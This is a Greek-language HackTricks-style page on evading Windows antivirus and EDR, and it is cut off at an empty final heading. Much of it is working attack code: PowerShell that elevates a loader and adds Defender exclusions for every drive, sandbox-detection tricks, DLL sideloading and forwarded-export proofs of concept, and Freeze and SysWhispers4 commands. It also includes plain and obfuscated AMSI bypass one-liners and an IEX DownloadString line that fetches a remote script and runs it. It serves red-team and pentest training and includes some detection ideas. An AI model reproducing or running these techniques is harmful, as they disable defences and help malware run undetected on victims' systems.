# Παράκαμψη Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Διακοπή του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσετε τη λειτουργία του Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο που σταματά τη λειτουργία του Windows Defender προσποιούμενο ότι είναι άλλο AV.
- [Απενεργοποίηση του Defender αν είστε διαχειριστής](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC τύπου installer πριν από την αλλοίωση του Defender

Δημόσια loaders που μεταμφιέζονται σε cheats παιχνιδιών συχνά διανέμονται ως unsigned installers Node.js/Nexe, οι οποίοι πρώτα **ζητούν από τον χρήστη αυξημένα δικαιώματα** και μόνο μετά εξουδετερώνουν το Defender. Η διαδικασία είναι απλή:

1. Ελέγχουν αν υπάρχει περιβάλλον διαχειριστή με την εντολή `net session`. Η εντολή πετυχαίνει μόνο όταν ο χρήστης έχει δικαιώματα διαχειριστή, επομένως η αποτυχία υποδεικνύει ότι ο loader εκτελείται ως τυπικός χρήστης.
2. Επανεκκινούν αμέσως τον εαυτό τους με το ρήμα `RunAs` για να εμφανιστεί το αναμενόμενο αίτημα συναίνεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν «cracked» λογισμικό, επομένως συνήθως αποδέχονται το prompt, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.<sup>[[26]](#references)</sup>

### Καθολικές εξαιρέσεις `MpPreference` για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει elevated δικαιώματα, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιούν εντελώς την υπηρεσία. Αρχικά, ο loader τερματίζει τη διεργασία επιτήρησης του GUI (`taskkill /F /IM SecHealthUI.exe`) και έπειτα προσθέτει **εξαιρετικά ευρείες εξαιρέσεις**, ώστε να μην είναι δυνατός ο έλεγχος κάθε προφίλ χρήστη, καταλόγου συστήματος και αφαιρούμενου δίσκου:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Ο βρόχος περνά από κάθε προσαρτημένο σύστημα αρχείων (D:\, E:\, USB sticks κ.λπ.), επομένως **κάθε μελλοντικό payload που αποθηκεύεται οπουδήποτε στον δίσκο αγνοείται**.
- Ο αποκλεισμός της επέκτασης `.sys` είναι προνοητικός—οι attackers διατηρούν την επιλογή να φορτώσουν unsigned drivers αργότερα, χωρίς να πειράξουν ξανά το Defender.
- Όλες οι αλλαγές γίνονται κάτω από το `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις παραμένουν ή να τις επεκτείνουν, χωρίς να ενεργοποιήσουν ξανά το UAC.

Επειδή δεν διακόπτεται καμία υπηρεσία του Defender, οι απλοϊκοί έλεγχοι υγείας συνεχίζουν να αναφέρουν «ενεργό antivirus», παρόλο που η επιθεώρηση σε πραγματικό χρόνο δεν ελέγχει ποτέ αυτές τις διαδρομές.<sup>[[26]](#references)</sup>

## **Μεθοδολογία αποφυγής AV**

Προς το παρόν, τα AV χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: στατική ανίχνευση, δυναμική ανάλυση και, για τα πιο προηγμένα EDR, ανάλυση συμπεριφοράς.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται με τον εντοπισμό γνωστών κακόβουλων συμβολοσειρών ή ακολουθιών byte σε ένα binary ή script, καθώς και με την εξαγωγή πληροφοριών από το ίδιο το αρχείο (π.χ. περιγραφή αρχείου, όνομα εταιρείας, ψηφιακές υπογραφές, εικονίδιο, checksum κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να οδηγήσει ευκολότερα στον εντοπισμό σας, καθώς πιθανότατα έχουν ήδη αναλυθεί και επισημανθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι να παρακάμψετε αυτό το είδος ανίχνευσης:

- **Κρυπτογράφηση**

Αν κρυπτογραφήσετε το binary, το AV δεν θα μπορεί να εντοπίσει το πρόγραμμά σας, αλλά θα χρειαστείτε κάποιο είδος loader για να το αποκρυπτογραφήσει και να το εκτελέσει στη μνήμη.

- **Obfuscation**

Μερικές φορές αρκεί να αλλάξετε ορισμένες συμβολοσειρές στο binary ή το script σας για να ξεγελάσετε το AV, αλλά αυτό μπορεί να είναι χρονοβόρο, ανάλογα με το τι προσπαθείτε να κάνετε obfuscate.

- **Προσαρμοσμένα εργαλεία**

Αν αναπτύξετε δικά σας εργαλεία, δεν θα υπάρχουν γνωστές κακόβουλες υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξετε τη στατική ανίχνευση του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ουσιαστικά, χωρίζει το αρχείο σε πολλά τμήματα και ζητά από το Defender να σαρώσει το καθένα ξεχωριστά. Έτσι, μπορεί να σας δείξει ακριβώς ποιες συμβολοσειρές ή ποια byte στο binary σας έχουν επισημανθεί.

Συνιστώ ανεπιφύλακτα να δείτε αυτήν την [playlist στο YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με την πρακτική αποφυγή AV.

### **Δυναμική ανάλυση**

Δυναμική ανάλυση είναι όταν το AV εκτελεί το binary σας σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των κωδικών πρόσβασης του browser σας, εκτέλεση minidump στο LSASS κ.λπ.). Αυτό μπορεί να είναι κάπως πιο δύσκολο, αλλά υπάρχουν μερικά πράγματα που μπορείτε να κάνετε για να αποφύγετε τα sandboxes.

- **Αναμονή πριν από την εκτέλεση** Ανάλογα με τον τρόπο υλοποίησής της, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης της δυναμικής ανάλυσης του AV. Τα AV έχουν πολύ λίγο χρόνο για να σαρώσουν αρχεία, ώστε να μην διακόπτουν τη ροή εργασίας του χρήστη, επομένως οι μεγάλες αναμονές μπορούν να εμποδίσουν την ανάλυση των binary. Το πρόβλημα είναι ότι πολλά sandbox των AV μπορούν απλώς να παραλείψουν την αναμονή, ανάλογα με τον τρόπο υλοποίησής της.
- **Έλεγχος των πόρων του υπολογιστή** Συνήθως τα sandbox έχουν πολύ περιορισμένους πόρους (π.χ. < 2GB RAM), διαφορετικά μπορεί να επιβραδύνουν τον υπολογιστή του χρήστη. Μπορείτε επίσης να γίνετε πολύ δημιουργικοί εδώ, ελέγχοντας, για παράδειγμα, τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων—δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Έλεγχοι ειδικοί για τον υπολογιστή** Αν θέλετε να στοχεύσετε έναν χρήστη του οποίου ο σταθμός εργασίας είναι συνδεδεμένος στον τομέα "contoso.local", μπορείτε να ελέγξετε τον τομέα του υπολογιστή για να δείτε αν ταιριάζει με αυτόν που ορίσατε. Αν δεν ταιριάζει, μπορείτε να τερματίσετε το πρόγραμμά σας.

Αποδεικνύεται ότι το όνομα υπολογιστή του sandbox του Microsoft Defender είναι HAL9TH. Επομένως, μπορείτε να ελέγξετε το όνομα του υπολογιστή στο malware σας πριν από την ενεργοποίησή του. Αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεστε μέσα στο sandbox του Defender, οπότε μπορείτε να τερματίσετε το πρόγραμμά σας.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμη πολύ καλές συμβουλές από τον [@mgeeky](https://twitter.com/mariuszbit) για την αντιμετώπιση των sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε και προηγουμένως σε αυτήν την ανάρτηση, τα **δημόσια εργαλεία** αργά ή γρήγορα **εντοπίζονται**, επομένως πρέπει να αναρωτηθείτε το εξής:

Για παράδειγμα, αν θέλετε να κάνετε dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσετε το mimikatz**; Ή θα μπορούσατε να χρησιμοποιήσετε ένα λιγότερο γνωστό project που κάνει επίσης dump το LSASS;

Η σωστή απάντηση είναι πιθανότατα η δεύτερη. Για παράδειγμα, το mimikatz είναι πιθανότατα ένα από τα πιο επισημασμένα malware από τα AV και EDR, αν όχι το πιο επισημασμένο. Αν και το ίδιο το project είναι εξαιρετικό, είναι επίσης εφιάλτης να το χρησιμοποιήσετε για να παρακάμψετε τα AV, γι' αυτό αναζητήστε εναλλακτικές λύσεις για αυτό που προσπαθείτε να πετύχετε.

> [!TIP]
> Όταν τροποποιείτε τα payloads σας για αποφυγή εντοπισμού, φροντίστε να **απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων** στο Defender και, σοβαρά, **ΜΗΝ ΤΑ ΑΝΕΒΑΖΕΤΕ ΣΤΟ VIRUSTOTAL** αν στόχος σας είναι η μακροπρόθεσμη αποφυγή εντοπισμού. Αν θέλετε να ελέγξετε αν ένα συγκεκριμένο AV εντοπίζει το payload σας, εγκαταστήστε το σε VM, δοκιμάστε να απενεργοποιήσετε την αυτόματη υποβολή δειγμάτων και δοκιμάστε το εκεί μέχρι να μείνετε ικανοποιημένοι με το αποτέλεσμα.

## EXEs έναντι DLLs

Όποτε είναι δυνατό, **προτιμάτε πάντα τη χρήση DLLs για αποφυγή εντοπισμού**. Από την εμπειρία μου, τα αρχεία DLL συνήθως **εντοπίζονται και αναλύονται πολύ λιγότερο**, οπότε πρόκειται για ένα πολύ απλό τέχνασμα που μπορείτε να χρησιμοποιήσετε σε ορισμένες περιπτώσεις για να αποφύγετε τον εντοπισμό (αν, φυσικά, το payload σας μπορεί να εκτελεστεί ως DLL).

Όπως βλέπουμε σε αυτήν την εικόνα, ένα DLL Payload από το Havoc έχει ποσοστό εντοπισμού 4/26 στο antiscan.me, ενώ το EXE payload έχει ποσοστό εντοπισμού 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>σύγκριση στο antiscan.me ενός κανονικού Havoc EXE payload με ένα κανονικό Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά τεχνάσματα που μπορείτε να χρησιμοποιήσετε με αρχεία DLL για να γίνετε πολύ πιο stealthy.

## DLL Sideloading & Proxying

Το **DLL Sideloading** αξιοποιεί τη σειρά αναζήτησης DLL που χρησιμοποιεί ο loader, τοποθετώντας την εφαρμογή-θύμα και τα κακόβουλα payloads δίπλα-δίπλα.

Μπορείτε να εντοπίσετε προγράμματα ευάλωτα σε DLL Sideloading χρησιμοποιώντας το [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων μέσα στο "C:\Program Files\\" που είναι ευάλωτα σε DLL hijacking, καθώς και τα αρχεία DLL που προσπαθούν να φορτώσουν.

Συνιστώ ανεπιφύλακτα να **εξερευνήσετε μόνοι σας προγράμματα που είναι ευάλωτα σε DLL Hijack/Sideload**, καθώς αυτή η τεχνική είναι αρκετά stealthy όταν εφαρμόζεται σωστά. Ωστόσο, αν χρησιμοποιήσετε δημόσια γνωστά προγράμματα που υποστηρίζουν DLL Sideloading, μπορεί να εντοπιστείτε εύκολα.

Αν απλώς τοποθετήσετε ένα κακόβουλο DLL με το όνομα του αρχείου που περιμένει να φορτώσει ένα πρόγραμμα, δεν θα φορτωθεί το payload σας, επειδή το πρόγραμμα αναμένει να υπάρχουν συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το πρόβλημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

Το **DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντάς μας να χειριστούμε την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) του [@flangvik](https://twitter.com/flangvik/).

Αυτά είναι τα βήματα που ακολούθησα:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό DLL μετονομασμένο.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Τόσο το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) όσο και το proxy DLL έχουν Detection rate 0/26 στο [antiscan.me](https://antiscan.me)! Θα το έλεγα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Συνιστώ ανεπιφύλακτα** να παρακολουθήσετε το [twitch VOD του S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) σχετικά με το DLL Sideloading, καθώς και το [βίντεο του ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), για να μάθετε περισσότερα σε βάθος για όσα συζητήσαμε.

### Κατάχρηση Forwarded Exports (ForwardSideLoading)

Οι μονάδες Windows PE μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι «forwarders»: αντί να δείχνει σε κώδικα, η εγγραφή εξαγωγής περιέχει μια συμβολοσειρά ASCII της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader θα:

- Φορτώσει το `TargetDll`, αν δεν έχει φορτωθεί ήδη
- Επιλύσει το `TargetFunc` από αυτό

Βασικές συμπεριφορές που πρέπει να γνωρίζετε:
- Αν το `TargetDll` είναι KnownDLL, παρέχεται από τον προστατευμένο χώρο ονομάτων KnownDLLs (π.χ. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Αν το `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, η οποία περιλαμβάνει τον κατάλογο της μονάδας που εκτελεί την προώθηση.

Έτσι, δημιουργείται ένα έμμεσο primitive sideloading: βρείτε ένα υπογεγραμμένο DLL που εξάγει μια συνάρτηση η οποία προωθείται σε όνομα μονάδας που δεν είναι KnownDLL και, στη συνέχεια, τοποθετήστε το υπογεγραμμένο DLL στον ίδιο κατάλογο με ένα DLL που ελέγχει ο attacker και έχει ακριβώς το όνομα της μονάδας-στόχου της προώθησης. Όταν κληθεί η προωθημένη εξαγωγή, ο loader επιλύει την προώθηση και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.<sup>[[13]](#references)</sup>

Παράδειγμα που παρατηρήθηκε στα Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` δεν είναι KnownDLL, επομένως επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (αντιγραφή-επικόλληση):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν φάκελο με δυνατότητα εγγραφής.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Αρκεί ένα ελάχιστο `DllMain` για να εκτελεστεί κώδικας· δεν χρειάζεται να υλοποιήσετε τη forwarded function για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Παρατηρούμενη συμπεριφορά:
- Το rundll32 (υπογεγραμμένο) φορτώνει το side-by-side `keyiso.dll` (υπογεγραμμένο)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια, ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν δεν έχει υλοποιηθεί το `SetAuditingInterface`, θα λάβετε σφάλμα "missing API" μόνο αφού έχει ήδη εκτελεστεί το `DllMain`

Συμβουλές αναζήτησης:
- Εστιάστε σε forwarded exports όπου το target module δεν είναι KnownDLL. Τα KnownDLLs καταγράφονται κάτω από το `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το inventory των forwarders των Windows 11 για να αναζητήσετε υποψήφια: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ιδέες για detection/άμυνα:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από διαδρομές εκτός συστήματος και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτόν τον κατάλογο
- Δημιουργήστε ειδοποίηση για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε διαδρομές εγγράψιμες από χρήστες
- Εφαρμόστε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε την εγγραφή και εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Το Freeze είναι ένα toolkit payload για την παράκαμψη EDRs μέσω suspended processes, direct syscalls και εναλλακτικών μεθόδων εκτέλεσης`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με stealth τρόπο.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Το evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού: ό,τι λειτουργεί σήμερα μπορεί να εντοπιστεί αύριο. Γι’ αυτό, μην βασίζεστε ποτέ σε ένα μόνο εργαλείο και, αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & Επίλυση SSN (SysWhispers4)

Τα EDR συχνά τοποθετούν **user-mode inline hooks** στα syscall stubs του `ntdll.dll`. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν το σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.<sup>[[32]](#references)</sup>

**Επιλογές κλήσης:**
- **Direct (embedded)**: εκπέμψτε μια εντολή `syscall`/`sysenter`/`SVC #0` στο stub που δημιουργείται (χωρίς πρόσβαση σε export του `ntdll`).
- **Indirect**: μεταβείτε σε ένα υπάρχον `syscall` gadget μέσα στο `ntdll`, ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από το `ntdll` (χρήσιμο για heuristic evasion). Το **randomized indirect** επιλέγει ένα gadget από μια δεξαμενή σε κάθε κλήση.
- **Egg-hunt**: αποφύγετε την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στον δίσκο· εντοπίστε μια ακολουθία syscall κατά τον χρόνο εκτέλεσης.

**Στρατηγικές επίλυσης SSN ανθεκτικές στα hooks:**
- **FreshyCalls (VA sort)**: συμπεράνετε τα SSN ταξινομώντας τα syscall stubs με βάση τις virtual address τους, αντί να διαβάζετε τα bytes των stubs.
- **SyscallsFromDisk**: αντιστοιχίστε στη μνήμη ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάστε τα SSN από το `.text` του και, στη συνέχεια, αποδεσμεύστε το (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάστε την εξαγωγή SSN μέσω ταξινόμησης VA με την επικύρωση opcode όταν ένα stub είναι καθαρό· αν είναι hooked, χρησιμοποιήστε ως εφεδρική λύση την εξαγωγή μέσω VA.
- **HW Breakpoint**: ορίστε το DR0 στην εντολή `syscall` και χρησιμοποιήστε ένα VEH για να καταγράψετε το SSN από το `EAX` κατά τον χρόνο εκτέλεσης, χωρίς να αναλύσετε hooked bytes.

Παράδειγμα χρήσης του SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέπει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν μπορούσες με κάποιον τρόπο να εκτελέσεις payloads **απευθείας στη μνήμη**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη στα εξής στοιχεία των Windows.

- User Account Control, ή UAC (ανύψωση δικαιωμάτων για εγκατάσταση EXE, COM, MSI ή ActiveX)
- PowerShell (scripts, διαδραστική χρήση και δυναμική αξιολόγηση κώδικα)
- Windows Script Host (wscript.exe και cscript.exe)
- JavaScript και VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts, εκθέτοντας το περιεχόμενό τους σε μη κρυπτογραφημένη και μη συσκοτισμένη μορφή.

Η εκτέλεση του `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατηρήστε πώς προσθέτει το πρόθεμα `amsi:` και στη συνέχεια τη διαδρομή του εκτελέσιμου από το οποίο εκτελέστηκε το script, στην προκειμένη περίπτωση, το powershell.exe

Δεν αποθηκεύσαμε κανένα αρχείο στον δίσκο, αλλά παρ' όλα αυτά εντοπιστήκαμε στη μνήμη λόγω του AMSI.

Επιπλέον, από την έκδοση **.NET 4.8** και μετά, ο κώδικας C# περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και τη φόρτωση εκτέλεσης στη μνήμη μέσω του `Assembly.Load(byte[])`. Γι' αυτό συνιστάται η χρήση παλαιότερων εκδόσεων του .NET (όπως η 4.7.2 ή παλαιότερη) για εκτέλεση στη μνήμη, αν θέλετε να παρακάμψετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Καθώς το AMSI βασίζεται κυρίως σε στατικές ανιχνεύσεις, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος αποφυγής της ανίχνευσης.

Ωστόσο, το AMSI μπορεί να αποσυσκοτίσει scripts ακόμη κι αν έχουν πολλά επίπεδα, επομένως το obfuscation μπορεί να είναι κακή επιλογή, ανάλογα με τον τρόπο που γίνεται. Αυτό σημαίνει ότι η παράκαμψή του δεν είναι τόσο απλή. Παρ' όλα αυτά, μερικές φορές αρκεί να αλλάξετε μερικά ονόματα μεταβλητών, οπότε εξαρτάται από το πόσο έντονα έχει επισημανθεί κάτι.

- **AMSI Bypass**

Καθώς το AMSI υλοποιείται με τη φόρτωση ενός DLL στη διεργασία powershell (καθώς και στις cscript.exe, wscript.exe κ.λπ.), είναι εύκολο να παραποιηθεί, ακόμη κι όταν εκτελείται ως μη προνομιούχος χρήστης. Λόγω αυτού του ελαττώματος στην υλοποίηση του AMSI, οι ερευνητές έχουν βρει πολλούς τρόπους παράκαμψης της σάρωσης AMSI.

**Πρόκληση σφάλματος**

Η πρόκληση αποτυχίας κατά την αρχικοποίηση του AMSI (amsiInitFailed) σημαίνει ότι δεν θα ξεκινήσει σάρωση για την τρέχουσα διεργασία. Αυτό αποκαλύφθηκε αρχικά από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε μια υπογραφή για να αποτρέψει την ευρύτερη χρήση του.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Αρκούσε μία γραμμή κώδικα powershell για να καταστήσει το AMSI άχρηστο στην τρέχουσα διεργασία powershell. Αυτή η γραμμή έχει, φυσικά, επισημανθεί από το ίδιο το AMSI, οπότε χρειάζεται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένα τροποποιημένο AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Αυτή η τεχνική ανακαλύφθηκε αρχικά από τον [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει τον εντοπισμό της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (η οποία είναι υπεύθυνη για τη σάρωση των δεδομένων εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό για το E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα είναι 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Διαβάστε το [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για παράκαμψη του AMSI με powershell. Δείτε [**αυτή τη σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα σχετικά.

### Αποκλεισμός του AMSI με αποτροπή φόρτωσης του amsi.dll (LdrLoadDll hook)

